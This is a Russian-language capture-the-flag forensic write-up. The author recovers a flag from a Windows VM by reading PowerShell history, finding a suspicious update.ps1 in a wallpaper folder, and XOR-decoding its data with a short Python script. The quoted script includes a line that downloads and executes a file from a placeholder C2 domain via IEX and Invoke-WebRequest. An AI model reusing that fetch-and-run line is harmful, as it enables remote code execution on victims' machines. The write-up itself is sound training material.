#forensic #writeup 

> Используйте виртуальную машину из Hourglass, чтобы найти второй флаг в системе!

Продолжая работу с виртуальной машиной из Hourglass, мы видим, что большинство журналов либо стерты, либо неинтересны, либо я не смог их найти, и у меня проблема с навыками...

Я проверяю историю Powershell с помощью следующей команды: `get-content C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` и появляются некоторые записи, одна строка представляет особый интерес.

`Set-Alias -Name UpdateSystem -Value "C:\Windows\Web\Wallpaper\Theme2\update.ps1"`

Файл PS1 ..? Внутри _обоев ..?_ Если это не кричит о вредоносном ПО, я не знаю, что будет...

При чтении файла PS1 нам выдаются следующие данные:

```ps1
$String_Key = 'W0wMadeitthisfar'

$NewValue = '$(' + (([int[]][char[]]$String | ForEach-Object { "[char]$($_)" }) -join '+') + ')'

$chars = 34, 95, 17, 57, 2, 16, 3, 18, 68, 16, 12, 54, 4, 82, 24, 45, 35, 0, 40, 63, 20, 10, 58, 25, 3, 65, 0, 20

$keyAscii = $String_Key.ToCharArray() | ForEach-Object { [int][char]$_ }

$resultArray = $chars -bxor $keyAscii

IEX (Invoke-WebRequest -Uri 'https://somec2attackerdomain.com/chrome.exe' -UseBasicParsing).Content
```

Глядя на данные, основной аспект, представляющий интерес, - это `$keyAscii` который использует `XOR` with `$chars` и `$keyAscii`.

`$keyAscii` просто `$String_Key` разделен на шестнадцатеричные символы. Поэтому нам просто нужно сопоставить их друг с другом.

В итоге я написал простой скрипт на Python, чтобы сделать это немного быстрее, поскольку Powershell отказывался выполнять XOR.

```python
x="34 95 17 57 2 16 3 18 68 16 12 54 4 82 24 45 35 0 40 63 20 10 58 25 3 65 0 20".split(' ')
y="87 48 119 77 97 100 101 105 116 116 104 105 115 102 97 114".split(' ')

flag=""
c=0
for n in range(len(x)):
    if c > len(y)-1:
        c=0
    flag+=chr(int(x[n])^int(y[c]))
    c+=1
print(flag)
```

```
$ python3 xor.py
uoftctf{0dd_w4y_t0_run_pw5h}
```